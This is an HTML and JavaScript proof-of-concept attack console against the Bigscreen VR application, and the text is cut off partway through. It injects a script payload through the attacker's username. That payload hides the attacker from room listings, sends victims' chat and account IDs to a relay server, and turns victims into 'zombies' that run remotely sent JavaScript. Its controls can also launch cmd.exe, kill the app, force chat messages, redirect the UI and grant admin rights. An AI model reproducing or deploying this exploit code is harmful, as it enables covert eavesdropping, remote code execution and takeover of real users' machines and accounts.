<!--

 WARNING: This source code was developed as proof-of-concept and is NOT production-ready!

 -->
<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="./bootstrap.min.css">
    <link rel="stylesheet" href="./main.css">

    <title>Man-in-the-Room Attack Proof of Concept - Bigscreen</title>
</head>
<body>
<div class="container-fluid">
    <div class="row">
        <div class="col-sm">
            <h1>Man-in-the-Room Attack <small class="text-muted">Proof of Concept</small></h1>
            <h2>Bigscreen <small class="text-muted"><a href="https://bigscreenvr.com/">https://bigscreenvr.com/</a></small></h2>
            <div class="alert alert-secondary alert-dismissible fade show" role="alert">
                <p class="h3 alert-heading">Features</p>
                <ul>
                    <li>Remote <abbr title="Read–Eval–Print Loop" class="initialism">REPL</abbr> (remote Javascript <code>eval</code>) on victim's machines.</li>
                    <li>Run program on victim's machine.</li>
                    <li>Attacker is not visible in VR room. Attacker's username is hidden from <i>Room Preview UI</i> and from <i>Room Participants UI</i>.</li>
                    <li>Victim's chat is persistently eavesdropped, even if they go to another room.</li>
                    <li>Remotely kill victim's Bigscreen application.</li>
                    <li>Play various sound effects.</li>
                    <li>Force user to send any chat message.</li>
                    <li>Force user to open screenshot directory.</li>
                    <li>Set selected user as admin (privilege escalation).</li>
                    <li>Kick user from room. <i>Only admin should be able to do this.</i></li>
                    <li>Change user's avatar.</li>
                    <li>Change room's settings (VR locks). <i>Only admin should be able to do this.</i></li>
                    <li>Redirect Bigscreen's <abbr title="User Interface" class="initialism">UI</abbr> to any webpage.</li>
                </ul>
                <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <form class="form-inline" id="joinRoomForm">
                <label class="mb-2 mr-sm-2" for="roomIdInput">Room ID: </label>
                <input class="mb-2 mr-sm-2 form-control" id="roomIdInput" type="text" placeholder="8we1jdc4" required>
                <input class="btn btn-outline-primary mb-2 mr-sm-2" type="submit" value="Eavesdrop">
            </form>
        </div>
    </div>
    <div class="row"><div class="col-sm">
        <div class="card"><div class="card-body">
            <div class="card-deck">
                <div class="card text-center" id="publicRooms">
                    <div class="card-header">Public rooms</div>
                    <ul class="list-group list-group-flush roomList"></ul>
                    <div class="card-footer text-muted roomList-footer">
                       <div class="form-check">
                            <input class="form-check-input" type="checkbox" value="" id="publicRoomsAutorefresh">
                            <label class="form-check-label" for="publicRoomsAutorefresh">autorefresh</label>
                        </div>
                        last update <time></time>
                    </div>
                </div>
                <div class="card text-center">
                    <div class="card-header">Discovered private rooms</div>
                    <ul class="list-group list-group-flush roomList"></ul>
                    <div class="card-footer text-muted roomList-footer">
                       <div class="form-check">
                            <input class="form-check-input" type="checkbox" value="" id="privateRoomsAutorefresh">
                            <label class="form-check-label" for="privateRoomsAutorefresh">autorefresh</label>
                        </div>
                        last update <time></time>
                    </div>
                </div>
                <div class="card text-center">
                    <div class="card-header">Zombies</div>
                    <ul class="list-group list-group-flush zombieList">
                        <li class="list-group-item">zombie</li>
                        <li class="list-group-item">zombie</li>
                        <li class="list-group-item">zombie</li>
                        <li class="list-group-item">zombie</li>
                        <li class="list-group-item">zombie</li>
                        <li class="list-group-item">zombie</li>
                        <li class="list-group-item">zombie</li>
                        <li class="list-group-item">zombie</li>
                        <li class="list-group-item">zombie</li>
                        <li class="list-group-item">zombie</li>
                        <li class="list-group-item">zombie</li>
                        <li class="list-group-item">zombie</li>
                    </ul>
                </div>
            </div>
        </div></div>
    </div></div>




<div id="rooms"></div>


</div>
<!-- Optional JavaScript -->
<!-- jQuery first, then Popper.js, then Bootstrap JS -->
<script src="./jquery-3.3.1.slim.min.js"></script>
<script src="./popper.min.js"></script>
<script src="./bootstrap.min.js"></script>
<script src="./adapter-latest.js"></script>
<script src="./msgpack.min.js"></script>
<script>
'use strict';

/**
 *
 * WARNING: This source code was developed as proof-of-concept and is NOT production-ready!
 *
 */

const bigscreenSignalUrl = 'wss://signal2.bigscreenvr.com';
const textName = '__Mallory__';
const relayServer = 'ws://172.26.103.128:8081'; // TODO
const unityVersion = '0.34.0';
const offerOptions = {
  offerToReceiveAudio: 1,
  offerToReceiveVideo: 1
};

<!--region GUI bindings -->
const joinRoomForm = document.getElementById('joinRoomForm');
const roomsElement = document.getElementById('rooms');
const roomIdInput = document.getElementById('roomIdInput');
<!--endregion-->

let rooms = {};
let repls = {};
let turnReady;
let dataChannelSend, dataChannelReceive;


function Repl(identity, formElement, inputElement, preElement){
    this.identity = identity;
    this.formElement = formElement;
    this.inputElement = inputElement;
    this.preElement = preElement;

    this.renderCmd = function(cmd){
        this.preElement.appendChild(document.createTextNode('≫ '+cmd+'\n'));
        this.preElement.scrollTop = this.preElement.scrollHeight;
    };

    this.renderResult = function(result){
        this.preElement.appendChild(document.createTextNode('← '+JSON.stringify(result)+'\n'));
        this.preElement.scrollTop = this.preElement.scrollHeight;
    };
}

/**
 *  Connection between room participants using WebRTC.
 */
function Connection(scid, pcid, roomParticipant){
    this.scid = scid;
    this.pcid = pcid;
    this.roomParticipant = roomParticipant;

    this.isStarted = false;
    this.isInitiator = false;
    this.rtcPeerConnection = null;
    this.remoteStream = null;

    this.maybeStart = function () {
        let that = this;
        if (!that.isStarted) {
            try {
                that.rtcPeerConnection = new RTCPeerConnection(null);
                that.rtcPeerConnection.onicecandidate = function (event) {
                    console.log('icecandidate event: ', event);
                    if (event.candidate) {
                        that.roomParticipant.room.sendSignalingMessage({
                            type: 'ice',
                            roomId: that.roomParticipant.room.roomId,
                            value: event.candidate.sdpMLineIndex + 'bigscreen_sdp_mline_index'
                                + event.candidate.sdpMid + 'bigscreen_sdp_mid' + event.candidate.candidate,
                            fromDevice: 'desktop',
                            targetDevice: 'desktop',
                            fromUser: that.roomParticipant.room.attackerIdentity.userId,
                            targetUser: that.roomParticipant.userId,
                            SCID: that.scid,
                            PCID: that.pcid,
                        });
                    } else {
                        console.log('End of candidates.');
                    }
                };
                that.rtcPeerConnection.ontrack  = function (event) {
                    console.log('Remote streams added.');
                    console.log(event.streams);
                    that.remoteStream = event.streams[0];
                    if(that.pcid === 0){
                        that.roomParticipant.videoElement.srcObject = event.streams[0];
                    }
                };
                that.rtcPeerConnection.onremovestream = function (event) {
                    console.log('Remote stream removed. Event: ', event);
                };

                console.log('Created RTCPeerConnnection');
            } catch (e) {
                console.log('Failed to create PeerConnection, exception: ' + e.message);
                alert('Cannot create RTCPeerConnection object.');
                return;
            }
            if (that.isInitiator){
                dataChannelSend = that.rtcPeerConnection.createDataChannel('__FOOBAR_DATA_CHANNEL_NAME_DIRECT__');
                dataChannelSend.onopen = that.onSendChannelStateChangeDirect;
                dataChannelSend.onclose = that.onSendChannelStateChangeDirect;
            }
            else{
                /*
                that.rtcPeerConnection.ondatachannel = function(event) {
                    console.log('Receive Channel Callback');
                    dataChannelReceive = event.channel;
                    dataChannelReceive.onmessage = function(event){
                        console.error('Received Message', connection, event.data);
                    };
                    dataChannelReceive.onopen = that.onReceiveChannelStateChangeDirect;
                    dataChannelReceive.onclose = that.onReceiveChannelStateChangeDirect;
                };
                */
            }

            that.isStarted = true;
            console.log('connection.isInitiator', that.isInitiator);
            if (that.isInitiator) {
                console.log('Sending offer to peer');
                that.rtcPeerConnection.createOffer(offerOptions).then(
                    function(sdp){that.setLocalAndSendMessage(sdp, that)}, that.handleCreateOfferError);
            }
        }
    };

    this.onSendChannelStateChangeDirect = function() {
      const readyState = dataChannelSend.readyState;
      console.log('dataChannelSend Send channel state is: ' + readyState);
    };

    this.onReceiveChannelStateChangeDirect = function() {
      const readyState = dataChannelReceive.readyState;
      console.log(`receiveDataChannelDirect Receive channel state is: ${readyState}`);
    };

    this.handleCreateOfferError = function(event) {
        console.log('createOffer() error: ', event);
    };

    this.setLocalAndSendMessage = function(sessionDescription) {
        this.rtcPeerConnection.setLocalDescription(sessionDescription);
        let sessionDescriptionMessage = {
            type: sessionDescription.type,
            roomId: this.roomParticipant.room.roomId,
            value: sessionDescription.sdp,
            fromDevice: 'desktop',
            targetDevice: 'desktop',
            fromUser: this.roomParticipant.room.attackerIdentity.userId,
            targetUser: this.roomParticipant.userId,
            SCID: this.scid,
            PCID: this.pcid,
        };
        console.log('setLocalAndSendMessage sending message', sessionDescriptionMessage);
        this.roomParticipant.room.sendSignalingMessage(sessionDescriptionMessage);
    };

    this.doAnswer = function() {
        let that = this;
        console.log('Sending answer to peer.');
        this.rtcPeerConnection.createAnswer().then(
            function(sdp){that.setLocalAndSendMessage(sdp, that)},
            that.onCreateSessionDescriptionError
        );
    };

    this.onCreateSessionDescriptionError = function(error) {
        console.log('Failed to create session description: ' + error.toString());
    };

    this.close = function(){
        if(this.rtcPeerConnection){
            this.rtcPeerConnection.close();
        }
    };
}

function Identity(name, uuid, steamId){
    this.name = name;
    this.uuid = uuid;
    this.steamId = steamId;

    this.userId = null;
}

function RoomParticipant(identity, room, userId){
    let that = this;
    this.identity = identity;
    this.room = room;
    this.userId = userId;
    /** Connection objects indexed by PCID */
    this.connections = {};

    //region UI
    let template = document.createElement('template');
    template.innerHTML = '<div class="col-sm-6">\n' +
        '           <div class="card">\n' +
        '              <video class="card-img-top" autoplay playsinline controls></video>\n' +
        '              <div class="card-body">\n' +
        '                <h5 class="_username card-title"></h5>\n' +
        '                <h6 class="_userId card-subtitle mb-2 text-muted"></h6>\n' +
        '                <h6 class="_uuid card-subtitle mb-2 text-muted"></h6>\n' +
        '                <p class="card-text"></p>\n' +
        '                <div class="btn-group" role="group">\n' +
        '                <div class="btn-group">\n' +
        '                    <button class="btn btn-primary dropdown-toggle" type="button" data-toggle="dropdown">\n' +
        '                        <b class="icon">🤖</b>\n' +
        '                        Control\n' +
        '                    </button>\n' +
        '                    <div class="dropdown-menu">\n' +
        '                        <form class="_redirectUI m-1">\n' +
        '                            <input type="text" name="redirectUI" class="form-control" placeholder="http://example.com/">\n' +
        '                            <button type="submit" class="btn btn-block btn-primary">Redirect UI</button>\n' +
        '                        </form>\n' +
        '                        <div class="dropdown-divider"></div>\n' +
        '                        <form class="_sendChat m-1">\n' +
        '                            <input type="text" name="sendChat" class="form-control" placeholder="chat message">\n' +
        '                            <button type="submit" class="btn btn-block btn-primary">Send chat</button>\n' +
        '                        </form>\n' +
        '                        <div class="dropdown-divider"></div>\n' +
        '                       <button class="_runCalc dropdown-item" type="button">Run <code>calc.exe</code></button>\n' +
        '                        <div class="dropdown-divider"></div>\n' +
        '                       <button class="_runCmd dropdown-item" type="button">Run <code>cmd.exe</code></button>\n' +
        '                       <div class="dropdown-divider"></div>\n' +
        '                       <button class="_openScreenshotDirectory dropdown-item" type="button">Open screenshot directory</button>\n' +
        '                       <div class="dropdown-divider"></div>\n' +
        '                       <button class="_playSoundEffects dropdown-item" type="button">Play sound effects</button>\n' +
        '                       <div class="dropdown-divider"></div>\n' +
        '                       <button class="_randomizeAvatar dropdown-item" type="button">Randomize avatar</button>\n' +
        '                       <div class="dropdown-divider"></div>\n' +
        '                       <button class="_exitApp dropdown-item" type="button">Kill Bigscreen app</button>\n' +
        '                    </div>\n' +
        '                </div>' +
        '                <button class="btn btn-primary" type="button" data-toggle="collapse" data-target="#repl'+this.room.roomId+this.userId+'">' +
        '                   <b class="icon">📡</b>' +
        '                   REPL</button>\n' +
        '                <button class="_setAdmin btn btn-secondary" type="button" >' +
        '                   <b class="icon">👑</b>' +
        '                   Admin' +
        '                </button>\n' +
        '                <button class="_kick btn btn-danger" type="button" >' +
        '                   <b class="icon">👋</b>' +
        '                   Kick' +
        '                </button>\n' +
        '                </div>\n' +
        '                <div class="collapse" id="repl'+this.room.roomId+this.userId+'">\n' +
        '                    <div class="card card-body p-0">\n' +
        '                    <pre class="repl"></pre>\n' +
        '                    <form class="_repl">\n' +
        '                        <div class="input-group">\n' +
        '                            <div class="input-group-prepend">\n' +
        '                                <span class="input-group-text">&Gt;</span>\n' +
        '                            </div>\n' +
        '                            <input type="text" name="repl" class="form-control" >\n' +
        '                            <div class="input-group-append">\n' +
        '                                <input class="btn btn-outline-danger" type="submit" value="Execute">\n' +
        '                            </div>\n' +
        '                        </div>\n' +
        '                    </form>\n' +
        '                    </div>\n' +
        '                </div>\n' +
        '              </div>\n' +
        '            </div>\n' +
        '        </div>';
    let cardElement = template.content.firstChild;
    this.cardElement = cardElement;
    this.videoElement = cardElement.getElementsByTagName('video')[0];
    repls[this.identity.uuid] = new Repl(
        this.identity,
        cardElement.getElementsByClassName('_repl')[0],
        cardElement.getElementsByClassName('_repl')[0].getElementsByTagName('input')[0],
        cardElement.getElementsByTagName('pre')[0],
    );
    cardElement.getElementsByClassName('_username')[0].appendChild(document.createTextNode(this.identity.name));
    cardElement.getElementsByClassName('_userId')[0].appendChild(document.createTextNode(this.userId));
    cardElement.getElementsByClassName('_uuid')[0].appendChild(document.createTextNode(this.identity.uuid));

    this.kickButton = cardElement.getElementsByClassName('_kick')[0];
    this.kickButton.addEventListener("click", function (event) {
        that.room.kickParticipant(that.userId);
    });
    cardElement.getElementsByClassName('_setAdmin')[0].addEventListener("click", function (event) {
        sendZombieCmd(that.identity.uuid, 'setMyUserAdmin();');
    });
    cardElement.getElementsByClassName('_runCalc')[0].addEventListener("click", function (event) {
        sendZombieCmd(that.identity.uuid, "openLink('calc');");
    });
    cardElement.getElementsByClassName('_runCmd')[0].addEventListener("click", function (event) {
        sendZombieCmd(that.identity.uuid, "openLink('cmd');");
    });
    cardElement.getElementsByClassName('_openScreenshotDirectory')[0].addEventListener("click", function(event) {
        sendZombieCmd(that.identity.uuid, "Unity.openScreenshotDirectory();");
    });
    cardElement.getElementsByClassName('_randomizeAvatar')[0].addEventListener("click", function(event) {
        sendZombieCmd(that.identity.uuid, "Unity.randomizeAvatar();");
    });
    cardElement.getElementsByClassName('_exitApp')[0].addEventListener("click", function(event) {
        sendZombieCmd(that.identity.uuid, "exitApp();");
    });
    cardElement.getElementsByClassName('_playSoundEffects')[0].addEventListener("click", function(event) {
        sendZombieCmd(that.identity.uuid,`
            var _se=["ui_select_1","ui_select_2","ui_select_3","ui_select_4","ui_select_5","ui_pause","ui_error_1","ui_error_2","ui_error_3","ui_error_4","ui_error_5","CAMERA-SLR- SHUTTER","Corked","Bing Bong"];
            var _i = 0;
            var _id;
            function _f(){if(_i<_se.length){Unity.playSoundEffect(_se[_i]);_i++;}else{clearInterval(_id)}};
            _id = setInterval(_f, 200);
        `);
    });

    cardElement.getElementsByClassName('_sendChat')[0].addEventListener("submit", function (event) {
        event.preventDefault();
        let input = cardElement.getElementsByClassName('_sendChat')[0].getElementsByTagName('input')[0];
        let msg = input.value;
        input.value = '';
        sendZombieCmd(
            that.identity.uuid,
            `displayChatMessage('${msg}', USER); Unity.sendMessageToBrowsers('chat',['${msg}'], USER, 'all');`
        );
        that.room.roomUI.renderChatMessage(msg, that.identity.name, new Date());
    });
    cardElement.getElementsByClassName('_redirectUI')[0].addEventListener("submit", function (event) {
        event.preventDefault();
        let input = cardElement.getElementsByClassName('_redirectUI')[0].getElementsByTagName('input')[0];
        let url = input.value;
        input.value = '';
        sendZombieCmd(
            that.identity.uuid,
            `window.location.replace('${url}');`
        );
    });

    this.render = function(){
        room.roomUI.participantsElement.appendChild(this.cardElement);
    };

    this.hide = function(){
        this.cardElement.parentNode.removeChild(this.cardElement);
    };
    //endregion

    this.closeConnections = function(){
        console.debug(`Closing all connections of participant ${this.userId} in room ${this.room.roomId}.`);
        for (let pcid in this.connections){
            if(this.connections.hasOwnProperty(pcid)){
                this.connections[pcid].close();
            }
        }
    }
}

//region XSS payloads
let hideUsernameFromRoomPreview = `Array.prototype.forEach.call(document.getElementById('room-card-players').childNodes,function(e,i,a){if(e.nodeName==='#text' && e.data==='${textName}'){if(i!==0){a[i-1].remove();}}e.remove();});`;
let hideFirstCommaFromRoomPreview = "setTimeout(function(){var n=document.getElementById('room-card-players').childNodes;if(n[0].nodeName==='SCRIPT'&&n[1].nodeName==='#text'&& n[1].data===', '){n[1].remove()}},1);";
let hideUsernameFromRoomParticipants = `Array.prototype.forEach.call(document.querySelectorAll('#room-participants li'),function(e){if(e.querySelector('h3.user-name').firstChild.nodeValue==='${textName}'){e.remove()}});`;
let persistentChatEavesdropping = `;sendChat=function(){var s=new WebSocket('${relayServer}');s.onopen=function(){s.send(JSON.stringify({'type':'chat','roomId':roomState.roomId,'name':NAME,'steamId':mySteamId,'oculusId':myOculusId,'message':$('#room-chat-input').val()}));if(canSendChatMessage){canSendChatMessage= false;var _0x1865xb7=$(_0x6af9[1362])[_0x6af9[743]]();if(_0x1865xb7!= _0x6af9[90]){$(_0x6af9[1362])[_0x6af9[743]](_0x6af9[90]);$(_0x6af9[1362])[_0x6af9[1359]]();displayChatMessage(_0x1865xb7,USER);Unity[_0x6af9[1072]](_0x6af9[1971],[_0x1865xb7],USER,_0x6af9[1972]);gaChatMessageSentEvent()};setTimeout(function(){canSendChatMessage= true},CHATRATELIMIT)};};};`;
let makeZombie = "var sz=new WebSocket('ws://172.26.103.128:8081');sz.onopen=function(){sz.send(JSON.stringify({'type':'zombie-register','steamId':mySteamId,'oculusId':myOculusId,'uuid':ACCOUNT.uuid}))};sz.onmessage=function(e){var m=JSON.parse(e.data);if(m.type==='zombie-cmd'){sz.send(JSON.stringify({type:'zombie-result','steamId':mySteamId,'oculusId':myOculusId,'uuid':ACCOUNT.uuid,result:eval(m.cmd)}))}};";
//endregion

let NAME = textName;
NAME += '<scr'+'ipt>';
NAME += hideUsernameFromRoomPreview;
NAME += hideFirstCommaFromRoomPreview;
NAME += hideUsernameFromRoomParticipants;
NAME += persistentChatEavesdropping;
NAME += makeZombie;
NAME += '</sc'+'ript>';

joinRoomForm.addEventListener("submit", function (event) {
    event.preventDefault();
    let roomId = roomIdInput.value;

    if(rooms[roomId]){console.warn('You are already connected to this room.'); return;}

    let attackerIdentity = new Identity(NAME, generateBigscreenUuid(), '', '');
    let room = new Room(roomId, attackerIdentity);
    rooms[roomId] = room;
    room._load(
        function(){room.join();},
        function(){console.error('ERROR', 'Could not load room information')}
    );
});

function RoomUI(roomId, room){
    let that = this;
    this.room = room;
    let roomCardTempalte = document.createElement('template');
    roomCardTempalte.innerHTML =
        '<div class="card">\n' +
        '    <div class="card-header">' +
        '       <code></code>' +
        '       <div class="dropdown display-inline-block">\n' +
        '           <button class="btn btn-info dropdown-toggle" type="button" data-toggle="dropdown">' +
        '               <b class="icon">⚙</b>' +
        '               Settings' +
        '           </button>\n' +
        '           <div class="dropdown-menu">\n' +
        '               <button class="_lockBigscreen dropdown-item text-white" type="button">\n' +
        '                   <b class="icon">🔓</b><b>Lock the big screen</b><br/>\n' +
        '                   Avoid interruptions when watching movies on the big screen.<br/> Prevent users from changing the big screen.\n' +
        '               </button>\n' +
        '               <button class="_lockDesktopAudio dropdown-item text-white" type="button">\n' +
        '                   <b class="icon">🔓</b><b>Lock desktop audio streaming</b><br/>\n' +
        '                   Prevent anyone from broadcasting a new Desktop Audio stream to the room.\n' +
        '               </button>\n' +
        '               <button class="_lockDrawing dropdown-item text-white" type="button">\n' +
        '                   <b class="icon">🔓</b><b>Lock 3D Drawing markers</b><br/>\n' +
        '                   Prevent anyone from using 3D markers to draw in your room.\n' +
        '               </button>\n' +
        '           </div>\n' +
        '       </div>' +
        '    </div>\n' +
        '    <div class="card-body">\n' +
        '        <div class="row">\n' +
        '            <div class="col-6 col-sm-4">\n' +
        '                <div class="card">\n' +
        '                    <div class="card-header"><b class="icon">📧</b>Chat</div>\n' +
        '                    <div class="card-body chat">\n' +
        '                    </div>\n' +
        '                </div>\n' +
        '            </div>\n' +
        '            <div class="col-6 col-sm-8">\n' +
        '                <div class="row"></div>\n' +
        '            </div>\n' +
        '      </div>\n' +
        '  </div>\n' +
        '</div>';
    this.roomCardElement = roomCardTempalte.content.firstChild;

    this.lockElements = {
        lockBigscreenButton: this.roomCardElement.querySelector('._lockBigscreen'),
        lockDesktopAudioButton:  this.roomCardElement.querySelector('._lockDesktopAudio'),
        lockDrawingButton: this.roomCardElement.querySelector('._lockDrawing'),
    };
    this.lockElements.lockBigscreenButton.addEventListener("click", function (event) {
        let locks = that.room.locks;
        locks.lockBigscreen = ! locks.lockBigscreen;
        that.room.updateLockSettings(locks);
    });
    this.lockElements.lockDesktopAudioButton.addEventListener("click", function (event) {
        let locks = that.room.locks;
        locks.lockDesktopAudio = ! locks.lockDesktopAudio;
        that.room.updateLockSettings(locks);
    });
    this.lockElements.lockDrawingButton.addEventListener("click", function (event) {
        let locks = that.room.locks;
        locks.lockDrawing = ! locks.lockDrawing;
        that.room.updateLockSettings(locks);
    });

    this.roomIdElement = this.roomCardElement.querySelector('.card-header code');
    this.roomIdElement.appendChild(document.createTextNode(roomId));

    this.chatBodyElement = this.roomCardElement.querySelector('div div div div div.card-body');
    this.participantsElement = this.roomCardElement.querySelector('div div div div.row');

    this.updateLockSettings = function(locks){
        if(locks.lockBigscreen) {
            this.lockElements.lockBigscreenButton.classList.remove('bg-danger');
            this.lockElements.lockBigscreenButton.classList.add('bg-success');
            this.lockElements.lockBigscreenButton.getElementsByTagName('b')[0].innerHTML = '';
            this.lockElements.lockBigscreenButton.getElementsByTagName('b')[0].appendChild(
                document.createTextNode('🔒')
            );
        }
        else{
            this.lockElements.lockBigscreenButton.classList.add('bg-danger');
            this.lockElements.lockBigscreenButton.classList.remove('bg-success');
            this.lockElements.lockBigscreenButton.getElementsByTagName('b')[0].innerHTML = '';
            this.lockElements.lockBigscreenButton.getElementsByTagName('b')[0].appendChild(
                document.createTextNode('🔓')
            );
        }

        if(locks.lockDesktopAudio) {
            this.lockElements.lockDesktopAudioButton.classList.remove('bg-danger');
            this.lockElements.lockDesktopAudioButton.classList.add('bg-success');
            this.lockElements.lockDesktopAudioButton.getElementsByTagName('b')[0].innerHTML = '';
            this.lockElements.lockDesktopAudioButton.getElementsByTagName('b')[0].appendChild(
                document.createTextNode('🔒')
            );
        }
        else{
            this.lockElements.lockDesktopAudioButton.classList.add('bg-danger');
            this.lockElements.lockDesktopAudioButton.classList.remove('bg-success');
            this.lockElements.lockDesktopAudioButton.getElementsByTagName('b')[0].innerHTML = '';
            this.lockElements.lockDesktopAudioButton.getElementsByTagName('b')[0].appendChild(
                document.createTextNode('🔓')
            );
        }

        if(locks.lockDrawing) {
            this.lockElements.lockDrawingButton.classList.remove('bg-danger');
            this.lockElements.lockDrawingButton.classList.add('bg-success');
            this.lockElements.lockDrawingButton.getElementsByTagName('b')[0].innerHTML = '';
            this.lockElements.lockDrawingButton.getElementsByTagName('b')[0].appendChild(
                document.createTextNode('🔒')
            );
        }
        else{
            this.lockElements.lockDrawingButton.classList.add('bg-danger');
            this.lockElements.lockDrawingButton.classList.remove('bg-success');
            this.lockElements.lockDrawingButton.getElementsByTagName('b')[0].innerHTML = '';
            this.lockElements.lockDrawingButton.getElementsByTagName('b')[0].appendChild(
                document.createTextNode('🔓')
            );
        }
    };

    this.render = function(parentElement){
        parentElement.appendChild(this.roomCardElement);
    };

    this.renderChatMessage = function(message, sender, date){
        let chatMessageTemplate = document.createElement('template');
        chatMessageTemplate.innerHTML =
            '<blockquote class="blockquote">\n' +
            '    <p class="mb-0"></p>\n' +
            '    <footer class="blockquote-footer"><cite title="Sender"></cite></footer>\n' +
            '</blockquote>\n';
        let chatMessageElement = chatMessageTemplate.content.firstChild;
        chatMessageElement.querySelector('p').appendChild(document.createTextNode(message));
        chatMessageElement.querySelector('footer cite').appendChild(document.createTextNode(sender));
        chatMessageElement.querySelector('footer').appendChild(document.createTextNode(' at '+date));
        this.chatBodyElement.appendChild(chatMessageElement);

        this.chatBodyElement.scrollTop = this.chatBodyElement.scrollHeight;
    }
}

/**
 * Room with connection to signalling server and participants.
 */
function Room(roomId, attackerIdentity){
    this.attackerIdentity = attackerIdentity;

    this.roomId = roomId;
    this.name = null;
    this.description = null;
    this.private = null;
    this.size = null;
    this.createdName = null;
    this.createdTime = null;
    this.roomType = null;
    this.category = null;
    this.environment = null;
    this.version = null;

    this.locks = null;

    this.lastUpdated = null;

    this.signalingWs = null;

    this.roomUI = null;
    this.roomParticipants = {};

    //region Init roomParticipants
    /*
     * TODO: Change app's logic so that we could periodicaly update room state and participants without losing
     * connections.
     * TODO: We currently do not support dealing with users leaving and joining room. We only support connection to
     * users who are alredy in the room when we join.
     */
    this._initRoomParticipants = function(onSuccess, onError){
        let that = this;
        let xhr = new XMLHttpRequest();
        xhr.overrideMimeType("application/json");
        xhr.onload = function () {
            let roomState = JSON.parse(xhr.responseText);
            let users = [];
            for(let key in roomState){
                if(roomState.hasOwnProperty(key) && (key.split('.')[0].substr(0,4) === 'user' )) {
                    let user = key.split('.')[0];
                    if(!users.includes(user)){users.push(user);}
                }
            }
            for (let i = 0; i < users.length; i++) {
                let userId = users[i];
                let identity = new Identity(
                    roomState[userId + '.name'],
                    roomState[userId + '.uuid'],
                    roomState[userId + '.steam'] ? roomState[userId + '.steam'] : ''
                );
                that.roomParticipants[userId] = new RoomParticipant(identity, that, userId);
            }
            onSuccess();
        };
        xhr.onerror = function () {
            console.error('ERROR', 'Room.initRoomParticipants()', xhr, that);
            onError();
        };
        xhr.open('GET', 'https://signal2adm.bigscreenvr.com/roomstate?roomId=' + this.roomId, true);
        xhr.send();
    };
    //endregion

    //region Load room information
    this._loadRoomInformation = function(onSuccess, onError){
        let that = this;
        let xhr = new XMLHttpRequest();
        xhr.overrideMimeType("application/json");
        xhr.onload = function () {
            let roomState = JSON.parse(xhr.responseText);

            that.name = roomState.name;
            that.description = roomState.description;
            that.private = roomState.private;
            that.size = roomState.size;
            that.createdName = roomState['created.name'];
            that.createdTime = roomState['created.time'];
            that.roomType = roomState.roomType;
            that.category = roomState.category;
            that.environment = roomState.environment;
            that.version = roomState.version;

            that.lastUpdated = new Date();
            onSuccess();
        };
        xhr.onerror = function () {
            console.error('ERROR', 'Room.update()', xhr, that);
            onError();
        };
        xhr.open('GET', 'https://signal2adm.bigscreenvr.com/roomstate?roomId=' + this.roomId, true);
        xhr.send();
    };
    //endregion

    /**
     * ASYNC Load room information from server.
     * Set room's data and create child objects based on retrieved infromation.
     */
    this._load = function(onSuccess, onError){
        let that = this;
        this._initRoomParticipants(
            function(){that._loadRoomInformation(onSuccess, onError);},
            onError
        );
    };

    this.sendSignalingMessage = function(message) {
        console.log('sendSignalingMessage', message);
        this.signalingWs.send(msgpack.encode(message));
    };

    this.kickParticipant = function(userId){
        this.sendSignalingMessage({
            type: "admin",
            action: "kick",
            roomId: this.roomId,
            targetUser: userId
        });
    };

    this.updateLockSettings = function(locks){
        this.roomUI.updateLockSettings(locks);

        this.sendSignalingMessage({
          type: 'admin',
          action: 'lock',
          roomId: this.roomId,
          msg: [
            (locks.lockBigscreen ? '' : 'un') + 'lock-bigscreen',
            (locks.lockDesktopAudio ? '' : 'un') + 'lock-desktopaudio',
            (locks.lockDrawing ? '' : 'un') + 'lock-drawing',
            (locks.lockMicrophones ? '' : 'un') + 'lock-microphones'
          ]
        });
    };

    /**
     * Join room. Connect to signaling server and establish WebRTC channels
     * with other room participants.
     */
    this.join = function(){
        let that = this;
        this.signalingWs = new WebSocket(bigscreenSignalUrl);
        this.signalingWs.binaryType = 'arraybuffer';
        this.signalingWs.onopen = function (event) {
            console.log('connected', event);

            let roomUI = new RoomUI(roomId, that);
            roomUI.render(roomsElement);
            that.roomUI = roomUI;
            for (let userId in that.roomParticipants){
                if(that.roomParticipants.hasOwnProperty(userId)){
                    that.roomParticipants[userId].render();
                }
            }

            that.sendSignalingMessage({type: 'register-desktop'});
            console.log('registered');

            that.sendSignalingMessage({
                'type': "room-join",
                'roomId': that.roomId,
                'name': that.attackerIdentity.name,
                'uuid': that.attackerIdentity.uuid,
                'version': unityVersion,
                'steamId': that.attackerIdentity.steamId,
                'oculusId': that.attackerIdentity.oculusId
            });
        };
        this.signalingWs.onclose = function (event) {
            console.log('onClose disconnected', event);
        };
        this.signalingWs.onmessage = function (event) {
            that.onSignalingMessage(event);
        };
        this.signalingWs.onerror = function (event) {
            console.log('onError event', event);
        };
    };

    this.onSignalingMessage = function(event) {
        let message = msgpack.decode(new Uint8Array(event.data));
        console.log('Room.onSignalingMessage()', message);

        switch (message.type) {
            case "user-left":{
                this.roomParticipants[message.userId].hide();
                this.roomParticipants[message.userId].closeConnections();
                delete this.roomParticipants[message.userId];
                console.log(`Participant ${message.userId} left room ${this.roomId}.`);
                break;
            }
            case "admin": {
                if(message.action === 'lock'){
                    this.locks = {
                        lockBigscreen: message.msg.includes('lock-bigscreen'),
                        lockDesktopAudio: message.msg.includes('lock-desktopaudio'),
                        lockDrawing: message.msg.includes('lock-drawing'),
                        lockMicrophones: message.msg.includes('lock-microphones'),
                    };
                    this.roomUI.updateLockSettings(this.locks);
                    console.log('updated locks', this.locks);
                }
                else{
                    console.error('unexpected action of message', message);
                }
                break;
            }
            case "room-latest":
            case "linkedpc-joined":
            case "linkedpc-left":
            case "party-join":
            case "user-ready":
            case "room-join-fail":
            case "room-created":
            case "room-environment":
            case "room-private":
            case "room-public":
            case "events":
            case "server-time":
                console.log('received message ignored', message);
                break;

            case "user-joined":
                if(message.uuid === this.attackerIdentity.uuid){
                    this.attackerIdentity.userId = message.userId;
                    console.log('set attackerIdentity.userId', this.attackerIdentity.userId);
                    console.log('user ready');

                    this.sendSignalingMessage({
                        type: "user-ready",
                        roomId: this.roomId,
                        userId: this.attackerIdentity.userId
                    });
                }
                break;

            case 'ice':
                console.log('onMessage received ICE');
                console.assert(message.fromDevice === 'desktop', message.fromDevice);

                const candidateStartPos = message.value.indexOf('candidate:');
